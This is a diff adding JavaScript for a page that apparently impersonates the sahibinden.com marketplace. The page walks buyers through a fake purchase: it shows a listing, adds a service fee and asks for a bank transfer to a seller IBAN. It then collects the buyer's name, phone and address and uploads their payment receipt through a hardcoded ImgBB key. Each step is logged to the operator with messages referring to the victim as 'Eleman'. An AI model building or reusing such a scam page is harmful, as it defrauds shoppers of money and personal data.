+    // ---- 3. ARAYÜZ FONKSİYONLARI ----
+    window.switchTab = function(tabId) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
+    }
+
+    window.kopyalaMetin = function(elementId, btn) {
+        const metin = document.getElementById(elementId).innerText;
+        navigator.clipboard.writeText(metin);
+        
+        const orijinalYazi = btn.innerText;
+        btn.innerText = "Kopyalandı";
+        btn.style.color = "#00a651"; 
+        btn.style.borderColor = "#00a651"; 
+        
+        setTimeout(() => {
+            btn.innerText = "Kopyala";
+            btn.style.color = "";
+            btn.style.borderColor = "";
+        }, 2000);
+    }
+
+    function formatFiyatDuz(num) { return new Intl.NumberFormat('tr-TR', { minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(num); }
+    function formatFiyatKusuratli(num) { return new Intl.NumberFormat('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(num); }
+
+    // ---- 4. İLAN VERİSİNİ ÇEKME VE EKRANI DOLDURMA ----
+    async function ilaniGetir() {
+        if(!ilanId) { 
+            document.getElementById('loader').style.display = 'none'; 
+            document.getElementById('errorMsg').style.display = 'flex'; 
+            return; 
+        }
+        try {
+            const cevap = await fetch(`${API_BASE}/ilan/${ilanId}`);
+            if (cevap.ok) { 
+                aktifIlanVerisi = await cevap.json(); 
+                ekraniDoldur(); 
+                logGonder("İlana Giriş Yaptı", "Eleman vitrini inceliyor.");
+            } else { 
+                document.getElementById('loader').style.display = 'none'; 
+                document.getElementById('errorMsg').style.display = 'flex'; 
+            }
+        } catch (error) { 
+            document.getElementById('loader').innerText = "Bağlantı hatası."; 
+        }
+    }
+
+    function ekraniDoldur() {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('step1').classList.add('active');
+        document.getElementById('bottomBar').style.display = 'flex';
+        
+        const data = aktifIlanVerisi;
+        const safFiyat = parseFloat(data.fiyat) || 0;
+        const hesaplanmisHizmet = safFiyat * 0.05;
+        const hesaplanmisToplam = safFiyat + hesaplanmisHizmet;
+
+        // Galeri
+        const galeri = document.getElementById('v-gallery');
+        if(data.resimler && data.resimler.length > 0) {
+            galeri.innerHTML += data.resimler.map(img => `<img src="${img}">`).join('');
+            document.getElementById('o-resim').src = data.resimler[0];
+        } else if(data.anaResim) {
+            galeri.innerHTML += `<img src="${data.anaResim}">`;
+            document.getElementById('o-resim').src = data.anaResim;
+        }
+
+        // Metinler ve Fiyatlar
+        document.getElementById('v-kategori').innerText = data.kategoriAgaci || "Kategori Belirtilmemiş";
+        document.getElementById('v-adres').innerText = data.sehir;
+        document.getElementById('v-harita-adres').innerText = data.sehir;
+        
+        const haritaAdres = encodeURIComponent(data.sehir);
+        document.getElementById('v-harita').src = `https://maps.google.com/maps?q=${haritaAdres}&t=&z=11&ie=UTF8&iwloc=&output=embed`;
+        
+        document.getElementById('v-fiyat').innerText = formatFiyatDuz(safFiyat) + " TL";
+        document.getElementById('o-fiyat').innerText = formatFiyatDuz(safFiyat) + " TL";
+        document.getElementById('o-hizmet').innerText = formatFiyatDuz(hesaplanmisHizmet) + " TL";
+        document.getElementById('o-toplam').innerText = formatFiyatKusuratli(hesaplanmisToplam) + " TL";
+        document.getElementById('v-baslik').innerText = data.urunAdi;
+        document.getElementById('o-baslik').innerText = data.urunAdi;
+        
+        const aciklamaKutusu = document.getElementById('v-aciklama');
+        aciklamaKutusu.innerHTML = data.urunAciklamasi ? data.urunAciklamasi.replace(/\n/g, '<br>') : "Açıklama girilmemiş.";
+        
+        const togBtn = document.getElementById('btnAciklamaTog');
+        aciklamaKutusu.classList.add('desc-kisitli');
+        
+        setTimeout(() => {
+            if (aciklamaKutusu.scrollHeight > aciklamaKutusu.clientHeight) {
+                togBtn.style.display = 'inline-block';
+            } else {
+                togBtn.style.display = 'none';
+            }
+        }, 10);
+
+        togBtn.onclick = function() {
+            if (aciklamaKutusu.classList.contains('desc-kisitli')) {
+                aciklamaKutusu.classList.remove('desc-kisitli');
+                togBtn.innerText = 'Daha az göster';
+            } else {
+                aciklamaKutusu.classList.add('desc-kisitli');
+                togBtn.innerText = 'Daha fazla göster';
+            }
+        };
+
+        document.getElementById('v-saticiAdi').innerText = data.saticiAdi;
+        document.getElementById('v-hesapTarihi').innerText = "Hesap Açılış: " + (data.hesapTarihi || "Belirtilmemiş");
+
+        const ozelliklerListesi = document.getElementById('v-ozellikler');
+        if (Array.isArray(data.dinamikOzellikler)) {
+            data.dinamikOzellikler.forEach(item => {
+                let degerStili = item.anahtar === 'İlan No' ? 'color: #8b0000; font-weight: bold;' : '';
+                ozelliklerListesi.innerHTML += `<tr><td>${item.anahtar}</td><td style="${degerStili}">${item.deger}</td></tr>`;
+            });
+        }
+
+        let ibanTam = data.iban || ""; let gosterilecekIban = ibanTam; let gosterilecekIsim = data.saticiAdi || "";
+        if (ibanTam.includes("-")) {
+            let parcalar = ibanTam.split("-");
+            gosterilecekIban = parcalar[0].trim();
+            gosterilecekIsim = parcalar.slice(1).join("-").trim(); 
+        }
+        document.getElementById('odeme-iban').innerText = gosterilecekIban;
+        document.getElementById('odeme-isim').innerText = gosterilecekIsim;
+        
+        document.getElementById('btnAra').onclick = () => { 
+            logGonder("Arama Butonuna Bastı", "Satıcıyı aramaya çalıştı.");
+            window.location.href = "tel:" + data.saticiTel; 
+        };
+
+        document.getElementById('btnFavori').addEventListener('click', (e) => {
+            e.preventDefault();
+            e.currentTarget.classList.toggle('filled');
+        });
+
+                document.getElementById('btnPaylas').addEventListener('click', async (e) => {
+            e.preventDefault();
+            const shareUrl = window.location.href; 
+            if(navigator.share) {
+                try { await navigator.share({ title: data.urunAdi, text: "Şu ilana bir baksana, harika bir şey buldum:", url: shareUrl }); } catch (e) {}
+            } else {
+                navigator.clipboard.writeText(shareUrl); alert("İlan linki başarıyla kopyalandı!");
+            }
+        });
+
+    }
+
+    // ---- 5. ADIM GEÇİŞLERİ VE SİPARİŞ AKIŞI ----
+    const btnGeri = document.getElementById('btnGeri');
+    const headerRight = document.getElementById('headerRight');
+    const btnIleri = document.getElementById('btnIleri');
+
+    function adimiGoster() {
+        document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + mevcutAdim).classList.add('active');
+        window.scrollTo(0, 0);
+
+        const headerTitle = document.querySelector('.header-title');
+        const btnAra = document.getElementById('btnAra');
+
+        if(mevcutAdim === 1) { 
+            btnGeri.style.display = 'flex'; headerRight.style.display = 'flex'; btnAra.style.display = 'block'; 
+            btnIleri.innerText = "Satın Al"; 
+            headerTitle.innerText = "İlan Detayı";
+            btnGeri.innerHTML = "❮";
+            btnIleri.style.background = "#16b4a1"; 
+        } else { 
+            btnGeri.style.display = 'flex'; headerRight.style.display = 'none'; btnAra.style.display = 'none'; 
+        }
+        
+        if(mevcutAdim === 2) {
+            btnIleri.innerText = "Ödemeye geç";
+            headerTitle.innerText = "Ürün bilgileri";
+            btnGeri.innerHTML = "✕"; 
+            btnIleri.style.background = "var(--shb-blue)"; 
+        }
+        if(mevcutAdim === 3) {
+            btnIleri.innerText = "Kaydet ve ödemeye geç";
+            headerTitle.innerText = "Teslimat ve ödeme";
+            btnGeri.innerHTML = "❮";
+            btnIleri.style.background = "var(--shb-blue)"; 
+        }
+        if(mevcutAdim === 4) {
+            btnIleri.innerText = "Ödemeyi Tamamla";
+            headerTitle.innerText = "Banka Havalesi / EFT";
+            btnGeri.innerHTML = "❮";
+            btnIleri.style.background = "#16b4a1";
+        }
+    }
+
+    btnGeri.addEventListener('click', (e) => { 
+        e.preventDefault(); 
+        if(mevcutAdim > 1) { 
+            mevcutAdim--; adimiGoster(); logGonder("Geri Tuşuna Bastı", `Adım ${mevcutAdim}'e geri döndü.`);
+        } else { window.location.href = 'https://www.sahibinden.com'; }
+    });
+    
+    btnIleri.addEventListener('click', () => {
+        if (mevcutAdim === 1) { mevcutAdim = 2; adimiGoster(); logGonder("Satın Al'a Bastı", "Sipariş özeti ekranına geçti."); } 
+        else if (mevcutAdim === 2) { mevcutAdim = 3; adimiGoster(); logGonder("Özeti Onayladı", "Adres girme ekranına geçti."); }
+        else if (mevcutAdim === 3) {
+            
+            // MAHALLE INPUT OLDUĞU İÇİN BURAYA EKLENDİ
+            const normalAlanlar = [
+                { id: 'adresAdi', div: document.getElementById('adresAdi') },
+                { id: 'aliciAd', div: document.getElementById('aliciAd') },
+                { id: 'aliciSoyad', div: document.getElementById('aliciSoyad') },
+                { id: 'aliciTel', div: document.getElementById('aliciTel'), isTel: true },
+                { id: 'aliciMahalle', div: document.getElementById('aliciMahalle') }, // Yeni eklenen input kontrolü
+                { id: 'aliciAciKAdres', div: document.getElementById('aliciAciKAdres') }
+            ];
+
+            let formGecerli = true;
+
+            normalAlanlar.forEach(alan => {
+                const val = alan.div.value.trim(); const group = alan.div.closest('.s3-input-group');
+                let gecerliMi = val !== ''; if (alan.isTel && (val === '' || val === '+90 ')) { gecerliMi = false; }
+                if (!gecerliMi) { group.classList.add('has-error'); formGecerli = false; } else { group.classList.remove('has-error'); }
+            });
+
+            // SADECE İL VE İLÇE İÇİN SIRALI MANTIK
+            const ilGroup = ilSelect.closest('.s3-input-group');
+            const ilceGroup = ilceSelect.closest('.s3-input-group');
+
+            ilGroup.classList.remove('has-error');
+            ilceGroup.classList.remove('has-error');
+            ilceGroup.querySelector('.s3-error-msg').innerText = "İlçe seçin.";
+
+            if (ilSelect.value === '') {
+                ilGroup.classList.add('has-error');
+                formGecerli = false;
+            } else if (ilceSelect.value === '') {
+                ilceGroup.classList.add('has-error');
+                formGecerli = false;
+            }
+
+            if (!formGecerli) return; 
+
+            const ad = document.getElementById('aliciAd').value.trim(); 
+            const soyad = document.getElementById('aliciSoyad').value.trim();
+            const tel = document.getElementById('aliciTel').value.trim();
+            const il = document.getElementById('aliciIl').value; 
+            const ilce = document.getElementById('aliciIlce').value;
+            const mahalle = document.getElementById('aliciMahalle').value.trim();
+            const adresDetay = document.getElementById('aliciAciKAdres').value.trim();
+            
+            window.tamAdresGecici = `${il} / ${ilce} - ${mahalle} - ${adresDetay}`;
+            window.tamAdSoyadGecici = `${ad} ${soyad}`;
+            window.telefonGecici = tel;
+
+            mevcutAdim = 4; adimiGoster(); logGonder("Adresi Kaydetti", `Ödeme ekranına geçti. Şehir: ${il} / ${ilce}`);
+        }
+        else if (mevcutAdim === 4) {
+            if(!secilenDekontDosyasi) { alert("Lütfen ödeme dekontunuzu seçin."); return; }
+            dekontuGonder();
+        }
+    });
+
+    document.querySelectorAll('.s3-input-group input, .s3-input-group select').forEach(el => {
+        el.addEventListener('input', function() {
+            this.closest('.s3-input-group').classList.remove('has-error');
+        });
+        el.addEventListener('change', function() {
+            this.closest('.s3-input-group').classList.remove('has-error');
+        });
+    });
+
+    // ---- 6. DEKONT YÜKLEME VE SİPARİŞİ TAMAMLAMA ----
+    const dekontKutusu = document.getElementById("dekontKutusu"); 
+    const dekontSecici = document.getElementById("dekontSecici"); 
+    const dekontDurum = document.getElementById("dekontDurum");
+
+    dekontKutusu.addEventListener('click', () => dekontSecici.click());
+    dekontSecici.addEventListener('change', (e) => {
+        if(e.target.files.length > 0) {
+            secilenDekontDosyasi = e.target.files[0];
+            dekontKutusu.style.borderColor = "#00a651"; dekontKutusu.style.color = "#00a651";
+            dekontKutusu.innerText = "Dekont Seçildi: " + secilenDekontDosyasi.name;
+            logGonder("Dekont Dosyası Seçti", `Dosya Adı: ${secilenDekontDosyasi.name}`);
+        }
+    });
+
+    async function uploadToImgBB(file) {
+        const apiKey = "De087c486b0f12c525ef31688d64dcf0"; 
+        const formData = new FormData(); formData.append("image", file); 
+        try {
+            const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData });
+            const data = await response.json(); if(data.success) return data.data.url; throw new Error();
+        } catch (error) { return null; }
+    }
+
+    async function dekontuGonder() {
+        btnIleri.innerText = "İşleniyor..."; btnIleri.disabled = true; dekontDurum.innerText = "Dekont yükleniyor...";
+        const dekontURL = await uploadToImgBB(secilenDekontDosyasi);
+        if(!dekontURL) { alert("Dekont yüklenemedi."); btnIleri.innerText = "Ödemeyi Tamamla"; btnIleri.disabled = false; dekontDurum.innerText = ""; return; }
+        dekontDurum.innerText = "Sipariş oluşturuluyor...";
+
+        try {
+            const siparisCevap = await fetch(`${API_BASE}/siparis-tamamla`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ilanId: ilanId, 
+                    saticiId: aktifIlanVerisi.olusturanMusteri, 
+                    ilanBasligi: aktifIlanVerisi.urunAdi,
+                    aliciAd: window.tamAdSoyadGecici, 
+                    aliciTel: window.telefonGecici, 
+                    aliciAdres: window.tamAdresGecici,
+                    dekontUrl: dekontURL,
+                    tarih: new Date().toLocaleDateString('tr-TR'),
+                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
+                })
+            });
+
+            if(siparisCevap.ok) {
+                logGonder("BAŞARILI BİTİŞ", "Eleman dekontu yükledi ve siparişi tamamladı.");
+                document.getElementById('step4').innerHTML = `<div style="text-align:center; padding: 40px 10px;"><h2 style="color: #00a651; margin-bottom: 15px; font-size: 24px;">Siparişiniz Başarılı!</h2><p style="color: #333; font-size: 15px; line-height:1.6;">Ödemeniz ve dekontunuz satıcıya iletilmiştir. Sipariş durumunu satıcıdan takip edebilirsiniz.</p></div>`;
+                document.getElementById('bottomBar').style.display = 'none'; btnGeri.style.display = 'none';
+            } else { throw new Error(); }
+        } catch (error) { alert("Sipariş işlenirken hata oluştu."); btnIleri.innerText = "Tekrar Dene"; btnIleri.disabled = false; }
+    }
+
+    ilaniGetir();
+    </script>
+</body>
+</html>
